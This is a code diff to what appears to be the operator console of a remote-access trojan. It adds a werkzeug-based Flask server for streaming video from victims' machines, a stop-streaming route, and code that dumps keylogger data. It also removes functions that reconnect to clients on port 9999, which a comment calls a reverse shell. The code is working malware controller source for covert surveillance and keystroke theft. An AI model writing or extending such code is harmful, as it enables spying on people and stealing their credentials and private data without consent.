@@ -7,6 +7,7 @@ import cv2
 import numpy as np
 import keyboard  # Import the keyboard library
 from datetime import datetime
+from werkzeug.serving import make_server
 
 init(autoreset=True)
 
@@ -66,12 +67,18 @@ def start_streaming(client_socket, mode, client_id):
     def video_feed():
         return Response(generate_frames(client_socket, client_id),
                         mimetype='multipart/x-mixed-replace; boundary=frame')
-      
+
+    # Start the Flask app in a separate thread to handle streaming
+    run_flask_app()
+
     print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
     print(Fore.BLUE + "[ * ] Streaming...")
 
-    # Run the Flask app in a separate thread to handle the streaming
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
+def run_flask_app():
+    global server_thread
+    app_server = make_server('0.0.0.0', 5000, app)
+    server_thread = threading.Thread(target=app_server.serve_forever)
+    server_thread.start()
 
 def generate_frames(client_socket, client_id):
     global streaming
@@ -120,32 +127,12 @@ def dump_keylogger_data():
             filtered_data.append(key)
     return ''.join(filtered_data)
 
-def reconnect_client(target_ip=None):
-    """Reconnect the specified client or all clients if 'all' is specified."""
-    if target_ip == 'all':
-        # Reconnect all clients
-        print(Fore.GREEN + "[ * ] Reconnecting all clients...")
-        for client_id in list(clients.keys()):  # Make a list of the keys to avoid the RuntimeError
-            client_info = clients[client_id]
-            target_ip = client_id.split(":")[0]  # Get the IP from the client_id
-            reconnect_socket(target_ip)  # Attempt to reconnect the client
-    elif target_ip:
-        print(Fore.GREEN + f"[ * ] Reconnecting client {target_ip}...")
-        reconnect_socket(target_ip)  # Attempt to reconnect a specific client
-
-def reconnect_socket(target_ip):
-    """Establish a new connection to the target IP."""
-    while True:
-        try:
-            # Create a new socket
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.connect((target_ip, 9999))  # Assuming the port is 9999 for reverse shell
-            print(Fore.GREEN + f"[ * ] Successfully reconnected to {target_ip}")
-            clients[f"{target_ip}:9999"] = {'socket': client_socket, 'streaming': False, 'keylogger_data': []}
-            break  # Exit loop when connection is successful
-        except socket.error as e:
-            print(Fore.RED + f"[ * ] Failed to reconnect to {target_ip}: {str(e)}")
-            time.sleep(5)  # Wait before trying to reconnect again
+@app.route('/stop_streaming')
+def stop_streaming():
+    global streaming
+    streaming = False  # Stop streaming
+    print(Fore.RED + "[ * ] Stopping streaming...")
+    return redirect(url_for('index'))
 
 def handle_client(client_socket, addr):
     target_ip, target_port = addr
@@ -168,11 +155,6 @@ def handle_client(client_socket, addr):
             print(Fore.YELLOW + "[ * ] Starting...")
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + response)
-
-        elif command == "reconnect":
-            target_ip = input(Fore.YELLOW + "Enter target IP (or 'all' to reconnect all): ")
-            reconnect_client(target_ip)
-            continue
 
         elif command == "migrate":
             print(Fore.YELLOW + "[ * ] Starting...")
